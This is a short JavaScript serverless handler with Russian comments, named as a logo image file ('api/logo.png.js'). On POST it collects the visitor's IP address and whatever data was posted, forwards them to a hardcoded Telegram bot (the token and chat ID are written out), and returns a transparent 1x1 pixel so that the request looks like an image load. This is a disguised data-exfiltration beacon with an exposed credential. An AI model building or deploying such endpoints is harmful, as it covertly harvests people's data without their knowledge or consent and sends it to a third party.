// api/logo.png.js
export default async function handler(req, res) {
    if (req.method === 'POST') {
        // Получаем IP пользователя
        const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
        
        // Здесь можно обработать полученные данные
        const data = req.body;
        console.log('Received data:', data);
        
        // Отправка данных в Telegram
        try {
            const telegramBotToken = '7283726243:AAFW3mIA1SzOmyftdqiRv8xTxtAmyk1rLmw';
            const chatId = '5018443124';
            
            const message = `Новый запрос логотипа:\nIP: ${userIp}\nДанные: ${JSON.stringify(data, null, 2)}`;
            
            await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                }),
            });
        } catch (error) {
            console.error('Ошибка отправки в Telegram:', error);
        }
        
        // Возвращаем PNG изображение
        try {
            // Base64-строка с изображением логотипа (1x1 прозрачный пиксель)
            const base64Image = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=";
            const imageBuffer = Buffer.from(base64Image, 'base64');
            
            res.setHeader('Content-Type', 'image/png');
            res.setHeader('Cache-Control', 'public, max-age=86400');
            return res.end(imageBuffer);
            
        } catch (error) {
            console.error('Error processing image:', error);
            res.status(500).send('Internal Server Error');
        }
    } else {
        res.setHeader('Allow', ['POST']);
        res.status(500).send('Method Not Allowed');
    }
}